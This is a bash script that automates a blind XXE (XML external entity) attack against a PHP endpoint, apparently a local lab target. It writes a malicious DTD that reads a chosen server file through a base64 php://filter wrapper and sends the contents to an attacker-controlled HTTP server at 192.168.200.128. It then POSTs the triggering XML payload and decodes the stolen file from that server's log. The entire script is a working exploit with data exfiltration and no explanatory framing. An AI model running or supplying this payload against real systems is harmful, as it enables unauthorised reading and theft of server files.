#!/bin/bash

echo -ne "\n[+] Enter file to retrieve: " && read -r filePath

# entity injection
xxe_dtd="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$filePath\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://192.168.200.128/?file=%file;'>\">
%eval;
%exfil;
"""

echo $xxe_dtd > ./xxe.dtd

python3 -m http.server 80 &>response &
PID=$!

sleep 1

# do POST request retrieving connection to attacker
curl -s -X POST "http://127.0.0.1:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.200.128/xxe.dtd"> %xxe;]>
		<root><name>test</name><tel>123123</tel><email>cxnsxle@cxnsxle.com</email><password>cxnsxle123</password></root>'

# response filter and decode
cat response | grep -oP "/?file=\K[^.*\s]+" | base64 -d

# brute kill of http server
kill -9 $PID
wait $PID 2>/dev/null

rm -f response 2>/dev/null
